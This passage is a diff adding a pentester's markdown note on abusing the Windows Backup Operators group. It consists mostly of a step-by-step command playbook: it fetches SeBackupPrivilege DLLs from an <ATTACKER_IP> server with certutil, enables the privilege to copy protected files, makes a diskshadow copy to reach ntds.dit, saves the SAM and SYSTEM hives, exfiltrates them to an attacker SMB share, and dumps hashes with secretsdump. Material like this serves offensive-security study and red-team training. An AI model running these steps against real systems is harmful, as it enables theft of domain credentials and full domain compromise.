@@ -1,0 +1,272 @@
+---
+Primary_category: ""
+title: ""
+draft: true
+banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
+banner_y: 0.88286
+tags:
+cssclasses:
+---
+
+###### PRIMARY CATEGORY → [[WINDOWS PRIVESC]]&nbsp;&nbsp;&nbsp;•&nbsp;&nbsp;&nbsp;[[WINDOWS SECURITY GROUPS|SECURITY GROUPS]]
+
+#### *Theory*
+
+Members of this group are granted with *seBackup* and *seRestore* privileges
+
+The former allows an operator who have compromised a user account with this privileged to be able to bypass any existing *ACE* on any system folder and also copy any file inside it
+
+##### *Default Privileges*
+
+```bash
+seInteractiveLogonRight
+seBackupPrivilege
+seRestorePrivilege
+SeBatchLogonRight
+SeShutdownPrivilege
+```
+
+---
+
+#### *Enumeration*
+
+##### *Listing the Groups to which the Current User belongs*
+
+```bash
+whoami /groups
+net user <USER>
+```
+
+##### *Members of Backup Operators*
+
+```bash
+net localgroup "Backup Operators"
+```
+
+---
+
+#### *Copy any Protected File*
+
+##### *Listing the Group Membership of the Current User*
+
+After landing on a machine, first we can list the groups to which the current user belongs to
+
+```bash
+whoami /group
+```
+
+And we notice that the current user is a member of the *Backup Operators* group
+
+As stated previously, members of this group are assigned with sensitive privileges such as *seBackup* and *seRestore*
+
+##### *Setup*
+
+> ***[Github: SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege)***
+
+###### *Downloading certain libraries*
+
+> ***From the attacker*** ⚔️
+
+- ***SeBackupPrivilegeCmdLets.dll***
+
+```bash
+curl --silent --location --request GET --remote-name 'https://github.com/giuliano108/SeBackupPrivilege/raw/refs/heads/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll'
+```
+
+- ***SeBackupPrivilegeUtils.dll***
+
+```bash
+curl --silent --location --request GET --remote-name 'https://github.com/giuliano108/SeBackupPrivilege/raw/refs/heads/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll'
+```
+
+###### *Transferring them to the target*
+
+> ***From the attacker*** ⚔️
+
+```bash
+python -m http.server 80
+```
+
+> ***From the target*** 🎯
+
+```bash
+mkdir C:\Windows\Temp\LPE
+cd C:\Windows\Temp\LPE
+```
+
+```bash
+certutil.exe -urlcache -split -f 'http://<ATTACKER_IP>/SeBackupPrivilegeCmdLets.dll'
+certutil.exe -urlcache -split -f 'http://<ATTACKER_IP>/SeBackupPrivilegeUtils.dll'
+```
+
+###### *Importing the Dynamic Libraries ( DLLs )*
+
+> ***From the target*** 🎯
+
+```bash
+Import-Module .\SeBackupPrivilegeCmdLets.dll
+Import-Module .\SeBackupPrivilegeUtils.dll
+```
+
+##### *Verifying if SeBackupPrivilege is enabled*
+
+Bear in mind that a principal may have a privileged assigned, but that privilege may be disabled
+
+We can check which privileges the current user has and if they are enabled or not by issuing one of the following commands
+
+```bash
+whoami /priv
+```
+
+> ***Get-SeBackupPrivilege***
+
+``` 
+Get-SeBackupPrivilege
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> SeBackupPrivilege is disabled
+> ```
+>
+
+If disabled, we can proceed as follows in order to enable the required privileged, namely *seBackupPrivilege*
+
+##### *Enabling SeBackupPrivilege*
+
+> ***Set-SeBackupPrivilege***
+
+```bash
+Set-SeBackupPrivilege
+```
+
+Then, we can check it out again as follows
+
+```bash
+whoami /priv
+Get-SeBackupPrivilege
+```
+
+##### *Copying any Protected File*
+
+Once we have the given privilege enabled, all that remains is to run the following command in order to copy any protected file
+
+> ***Copy-FileSeBackupPrivilege***
+
+```bash
+Copy-FileSeBackupPrivilege '<RESOURCE_PATH>' '<OUTPUT_FILE>'
+```
+
+> [!DANGER]- *e.g.*
+>
+> ```bash
+> Copy-FileSeBackupPrivilege 'C:\Confidential\creds.txt' '.\creds.txt'
+> ```
+>
+
+Or simply use *Robocopy.exe*, which is way faster than the above command
+
+```bash
+robocopy.exe /B '<RESOURCE_PATH>' '<DESTINATION_PATH'
+```
+
+---
+
+#### *( NTDS | SAM ) + SYSTEM -  Exfiltration*
+
+Bear in mind that members of this group can log in to a *DC* interactively
+
+Therefore, we can log in locally to a *DC* and try to extract the ***[[NTDS|NTDS.dit]]*** file information in order to retrieve most of the sensitive domain data such as *NTLM* hashes, *AES* keys and so on
+
+##### *Performing a Shadow Copy of C:*
+
+> ***From the target*** 🎯
+
+We cannot copy the *NTDS.dit* file directly as it is locked by default, just as with *SAM*, *SYSTEM* and *SECURITY* files
+
+However, we can carry out a *shadow copy* of the *C:*  volume and expose it as an *E:* drive in order to access all the resources of the given *shadow copy*
+
+To do so, we can proceed as follows
+
+```bash
+diskshadow.exe
+```
+
+```bash
+DISKSHADOW> set verbose on
+DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
+DISKSHADOW> set context clientaccessible
+DISKSHADOW> set context persistent
+DISKSHADOW> begin backup
+DISKSHADOW> add volume C: alias cdrive
+DISKSHADOW> create
+DISKSHADOW> expose %cdrive% E:
+DISKSHADOW> end backup
+DISKSHADOW> exit
+```
+
+##### *Setting up a File Transfer Alternative*
+
+> ***From the target*** 🎯
+
+Since we want to transfer the sensitive file we are going to copy to the attacker's machine for further processing, we can set an *SMB* share as follows
+
+> ***From the attacker*** ⚔️
+
+```bash
+smbserver.py -smb2support -user 4l3xbb -password 4l3xbb smbFolder "$( pwd )"
+```
+
+> ***From the target*** 🎯
+
+```bash
+net use X: \\<ATTACKER_IP>\smbFolder /USER:4l3xbb 4l3xbb
+```
+
+##### *Copying NTDS.dit Locally*
+
+> ***From the target*** 🎯
+
+Then, we can leverage the *seBackupPrivilege* to bypass the *NTDS.dit's DACL* and be able to copy it locally from the *Shadow Copy* volume
+
+> ***First, carry out [[#Setup|this setup]]***
+
+> ***If seBackupPrivilege is disabled, see [[#Enabling SeBackupPrivilege]] or [[WINDOWS PRIVESC#Enabling disabled Privileges|this]]***
+
+To do so, we can use either *Copy-FileSeBackupPrivilege* or *Robocopy.exe*
+
+> ***Robocopy.exe***
+
+```bash
+robocopy.exe /B 'E:\Windows\NTDS' 'X:\' 'ntds.dit'
+```
+
+> ***Copy-FileSeBackupPrivilege***
+
+```bash
+Copy-FileSeBackupPrivilege 'E:\Windows\NTDS\ntds.dit' 'X:\ntds.dit'
+```
+
+##### *Copying SAM, SYSTEM and SECURITY*
+
+> ***From the target*** 🎯
+
+This privilege also lets us backup the *SAM*, *SYSTEM* and *SECURITY* hives
+
+```bash
+reg save 'HKLM\SAM' 'X:\SAM'
+reg save 'HKLM\SYSTEM' 'X:\SYSTEM'
+```
+
+##### *Offline Credentials Extraction*
+
+> ***From the attacker*** ⚔️
+
+###### *Impacket's Secretsdump.py*
+
+> ***[Secretsdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)***
+
+```bash
+secretsdump.py -ntds ./ntds.dit -sam ./SAM -system ./SYSTEM -security ./SECURITY LOCAL
+```
